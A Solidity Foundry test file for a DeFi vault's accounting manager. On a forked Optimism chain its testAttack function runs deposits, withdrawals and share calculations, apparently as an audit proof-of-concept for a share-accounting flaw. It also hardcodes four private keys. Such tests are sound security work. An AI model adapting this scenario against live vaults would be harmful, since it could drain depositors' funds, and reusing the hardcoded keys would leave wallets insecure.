// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.20;

import "./utils/testStarter.sol";
import "contracts/helpers/BaseConnector.sol";
import "contracts/accountingManager/NoyaFeeReceiver.sol";
import "./utils/resources/OptimismAddresses.sol";
import "contracts/governance/Keepers.sol";
import "./utils/mocks/EmergancyMock.sol";
import "./utils/mocks/ConnectorMock2.sol";

contract TestAccounting is testStarter, OptimismAddresses {
    using SafeERC20 for IERC20;

    address connector;
    address connector2;
    NoyaFeeReceiver managementFeeReceiver;
    NoyaFeeReceiver performanceFeeReceiver;
    address withdrawFeeReceiver = bob;

    uint256 privateKey1 = 0x99ba14aff4aba765903a41b48aacdf600b6fcdb2b0c2424cd2f8f2c089f20476;
    uint256 privateKey2 = 0x68ab62e784b873b929e98fc6b6696abcc624cf71af05bf8d88b4287e9b58ab99;
    uint256 privateKey3 = 0x952b55e8680117e6de5bde1d3e7902baa89bfde931538a5bb42ba392ef3464a4;
    uint256 privateKey4 = 0x885f1d08ebc23709517fedbec64418e4a09ac1e47e976c868fd8c93de0f88f09;

    function setUp() public {
        // --------------------------------- set env --------------------------------
        uint256 fork = vm.createFork(RPC_URL, startingBlock);
        vm.selectFork(fork);

        console.log("Test timestamp: %s", block.timestamp);

        // --------------------------------- deploy the contracts ---------------------------------
        vm.startPrank(owner);

        deployEverythingNormal(USDC);

        // --------------------------------- init connector ---------------------------------
        connector = address(new BaseConnector(BaseConnectorCP(registry, 0, swapHandler, noyaOracle)));
        connector2 = address(new ConnectorMock2(address(registry), 0));

        // ------------------- add connector to registry -------------------
        addConnectorToRegistry(vaultId, connector);
        addConnectorToRegistry(vaultId, connector2);
        console.log("AaveConnector added to registry");

        addTrustedTokens(vaultId, address(accountingManager), USDC);
        addTrustedTokens(vaultId, address(accountingManager), DAI);

        addTokenToChainlinkOracle(address(USDC), address(840), address(USDC_USD_FEED));
        addTokenToNoyaOracle(address(USDC), address(chainlinkOracle));

        addTokenToChainlinkOracle(address(DAI), address(840), address(DAI_USD_FEED));
        addTokenToNoyaOracle(address(DAI), address(chainlinkOracle));

        console.log("Tokens added to registry");
        registry.addTrustedPosition(vaultId, 0, address(accountingManager), false, false, abi.encode(USDC), "");
        registry.addTrustedPosition(vaultId, 0, address(accountingManager), false, false, abi.encode(DAI), "");
        console.log("Positions added to registry");

        managementFeeReceiver = new NoyaFeeReceiver(address(accountingManager), baseToken, owner);
        performanceFeeReceiver = new NoyaFeeReceiver(address(accountingManager), baseToken, owner);

        accountingManager.updateValueOracle(noyaOracle);
        vm.stopPrank();
    }

    function testAttack() public {
        console.log("-----------Base Workflow--------------");
        uint256 _amount = 1;

        _dealWhale(baseToken, address(alice), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23),  _amount);
        _dealWhale(baseToken, address(bob), address(0x1AB4973a48dc892Cd9971ECE8e01DcC7688f8F23), 1e8);

        vm.startPrank(alice);

        //     // ------------------------------ deposit ------------------------------
        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), _amount);
        accountingManager.deposit(address(alice), _amount, address(0));

        vm.stopPrank();
        vm.startPrank(owner);
        accountingManager.calculateDepositShares(1);
        vm.warp(block.timestamp + 35 minutes);
        accountingManager.executeDeposit(10, connector, "");

        vm.stopPrank();
        vm.startPrank(bob);
        // ------------------------------ deposit ------------------------------
        SafeERC20.forceApprove(IERC20(USDC), address(accountingManager), 1e6);
        accountingManager.deposit(address(bob), 1e6, address(0));

        vm.stopPrank();
        vm.startPrank(owner);
        accountingManager.calculateDepositShares(1);
        vm.warp(block.timestamp + 35 minutes);
        accountingManager.executeDeposit(10, connector, "");

        vm.stopPrank();
        uint256 balanceAlice = accountingManager.balanceOf(alice);
        uint256 balanceBob = accountingManager.balanceOf(bob);

        console.log("Alice's balance: %s", balanceAlice);
        console.log("Bob's balance: %s", balanceBob);

        // ------------------------------ withdraw ------------------------------
        vm.startPrank(alice);
        accountingManager.withdraw( balanceAlice, address(alice));
        vm.stopPrank();
        vm.startPrank(owner);
        accountingManager.calculateWithdrawShares(1);
        accountingManager.startCurrentWithdrawGroup();

        bytes memory data = hex"1232";
        RetrieveData[] memory retrieveData = new RetrieveData[](1);
        retrieveData[0] = RetrieveData(balanceAlice, address(connector), abi.encode(balanceAlice, data));

        accountingManager.retrieveTokensForWithdraw(
            retrieveData,
            connector,
            ""
        );

        accountingManager.fulfillCurrentWithdrawGroup();

        vm.warp(block.timestamp + 7 hours);
        accountingManager.executeWithdraw(10);
        vm.stopPrank();

        uint256 aliceBalanceAfterWithdraw = IERC20(USDC).balanceOf(alice);
        console.log("Alice's balance after withdraw: %s", aliceBalanceAfterWithdraw);
    }
}
